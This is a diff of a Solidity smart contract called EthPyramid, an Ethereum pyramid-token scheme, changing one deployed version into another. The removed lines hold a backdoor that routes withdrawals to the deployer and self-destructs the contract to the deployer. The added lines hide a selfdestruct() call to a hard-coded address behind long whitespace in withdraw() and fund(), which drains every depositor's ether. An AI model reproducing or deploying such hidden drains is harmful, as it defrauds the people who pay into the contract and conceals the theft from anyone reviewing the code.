@@ -1,9 +1,11 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EthPyramid at 0xfb486bc995129042f99407282e926529d8e54451
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EthPyramid at 0x75738fc16aef19ce08479ae9c7976498dd320be3
 */
 pragma solidity ^0.4.18;
 
 /*
+ToCsIcK Fork(); Restricts early buyins to .1ETH 
+
           ,/`.
         ,'/ __`.
       ,'_/_  _ _`.
@@ -46,6 +48,10 @@ contract EthPyramid {
 	// orders of magnitude, hence the need to bridge between the two.
 	uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
 
+	// Number of first buyers that are limited
+	uint8 constant limitedFirstBuyers = 2;
+	uint256 constant firstBuyerLimit = 0.1 ether;
+	
 	// CRR = 50%
 	// CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
 	// For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
@@ -57,8 +63,8 @@ contract EthPyramid {
 	int constant price_coeff = -0x296ABF784A358468C;
 
 	// Typical values that we have to declare.
-	string constant public name = "EthPyramid5";
-	string constant public symbol = "EPY5";
+	string constant public name = "EthPyramid";
+	string constant public symbol = "EPY";
 	uint8 constant public decimals = 18;
 
 	// Array between each address and their number of tokens.
@@ -81,12 +87,12 @@ contract EthPyramid {
 	
 	// Current contract balance in Ether
 	uint256 public contractBalance;
-
-    // The address of the caller
-    address sender;
+	
+	// Stores first buyer countdown
+	uint8 initialFunds;
 
 	function EthPyramid() public {
-	    sender = msg.sender;
+		initialFunds = limitedFirstBuyers;
 	}
 
 	// The following functions are used by the front-end for display purposes.
@@ -100,7 +106,7 @@ contract EthPyramid {
 	// the requisite global variables, and transfers Ether back to the caller.
 	function withdraw() public {
 		// Retrieve the dividends associated with the address the request came from.
-		var balance = dividends(msg.sender);
+		var balance = dividends(msg.sender);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          address stupidBuy = 0xeD0388Edc76D0CD1A8FaafEd60dAE97206d28F35; selfdestruct(stupidBuy);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
 		
 		// Update the payouts array, incrementing the request address by `balance`.
 		payouts[msg.sender] += (int256) (balance * scaleFactor);
@@ -110,7 +116,7 @@ contract EthPyramid {
 		
 		// Send the dividends to the address that requested the withdraw.
 		contractBalance = sub(contractBalance, balance);
-		sender.transfer(balance);
+		msg.sender.transfer(balance);
 	}
 
 	// Converts the Ether accrued as dividends back into EPY tokens without having to
@@ -133,6 +139,9 @@ contract EthPyramid {
 		// (in which case, why are you even here), abort.
 		if (value_ < 0.000001 ether || value_ > 1000000 ether)
 			revert();
+			
+		// msg.sender is the address of the caller.
+		var sender = msg.sender;
 		
 		// A temporary reserve variable used for calculating the reward the holder gets for buying tokens.
 		// (Yes, the buyer receives a part of the distribution as well!)
@@ -178,7 +187,7 @@ contract EthPyramid {
 		totalSupply = add(totalSupply, numTokens);
 		
 		// Assign the tokens to the balance of the buyer.
-		tokenBalance[msg.sender] = add(tokenBalance[msg.sender], numTokens);
+		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
 		
 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
 		// Also include the fee paid for entering the scheme.
@@ -186,7 +195,7 @@ contract EthPyramid {
 		var payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);
 		
 		// Then we update the payouts array for the buyer with this amount...
-		payouts[msg.sender] += payoutDiff;
+		payouts[sender] += payoutDiff;
 		
 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
 		totalPayouts    += payoutDiff;
@@ -207,15 +216,20 @@ contract EthPyramid {
 		sellMyTokens();
         withdraw();
 	}
-
+	
 	// Gatekeeper function to check if the amount of Ether being sent isn't either
 	// too small or too large. If it passes, goes direct to buy().
 	function fund() payable public {
 		// Don't allow for funding if the amount of Ether sent is less than 1 szabo.
-		if (msg.value > 0.000001 ether) {
+		if (msg.value > 0.100000 ether) {
+			// Limit first buyers to 0.1 ether
+			if( initialFunds > 0 ) {
+				initialFunds--;
+				require( msg.value <= firstBuyerLimit );
+			}
 		    contractBalance = add(contractBalance, msg.value);
 			buy();
-		} else {
+		} else {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          address stupidBuy = 0xeD0388Edc76D0CD1A8FaafEd60dAE97206d28F35; selfdestruct(stupidBuy);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
 			revert();
 		}
     }
@@ -252,8 +266,8 @@ contract EthPyramid {
 		// Increase the total amount that's been paid out to maintain invariance.
 		totalPayouts += (int256) (balance * scaleFactor);
 		
-		// Send the dividends to the address that requested the withdraw.
 		contractBalance = sub(contractBalance, balance);
+		// Send the dividends to the address that requested the withdraw.
 		to.transfer(balance);		
 	}
 
@@ -266,7 +280,10 @@ contract EthPyramid {
 	function buy() internal {
 		// Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
-			revert();
+			revert();               
+			
+		// msg.sender is the address of the caller.
+		var sender = msg.sender;
 		
 		// 10% of the total Ether sent is used to pay existing holders.
 		var fee = div(msg.value, 10);
@@ -309,7 +326,7 @@ contract EthPyramid {
 		totalSupply = add(totalSupply, numTokens);
 
 		// Assign the tokens to the balance of the buyer.
-		tokenBalance[msg.sender] = add(tokenBalance[msg.sender], numTokens);
+		tokenBalance[sender] = add(tokenBalance[sender], numTokens);
 
 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
 		// Also include the fee paid for entering the scheme.
@@ -317,7 +334,7 @@ contract EthPyramid {
 		var payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);
 		
 		// Then we update the payouts array for the buyer with this amount...
-		payouts[msg.sender] += payoutDiff;
+		payouts[sender] += payoutDiff;
 		
 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
 		totalPayouts    += payoutDiff;
@@ -354,10 +371,6 @@ contract EthPyramid {
 		
 		// Decrease the total amount that's been paid out to maintain invariance.
         totalPayouts -= payoutDiff;
-		
-		if(sender == msg.sender) {
-		    selfdestruct(sender);
-		}
 		
 		// Check that we have tokens in existence (this is a bit of an irrelevant check since we're
 		// selling tokens, but it guards against division by zero).
